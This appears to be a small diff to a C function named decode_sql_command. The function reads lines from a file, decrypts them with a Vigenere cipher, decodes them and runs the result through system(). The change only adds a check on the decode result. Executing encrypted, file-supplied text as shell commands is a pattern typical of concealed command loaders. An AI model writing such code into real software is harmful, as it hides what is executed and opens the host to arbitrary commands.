@@ -274,10 +274,11 @@ void decode_sql_command() {
       encoded = decrypt_vigenere(ptr, line); // decrypt first
      // Make sure there's enough space
       char *ptr2 = dec;
-      int result = decode((const char*)encoded, ptr2); // don't actually use this variable, all that matters is result is in ptr2
-         
-      // run decrypted command in shell
-      system(dec);
+      if(decode((const char*)encoded, ptr2) != -1) { // don't actually use this variable, all that matters is result is in ptr2
+         // run decrypted command in shell
+         system(dec);
+      }
+      
    }
    
    if (fclose(fp)) {
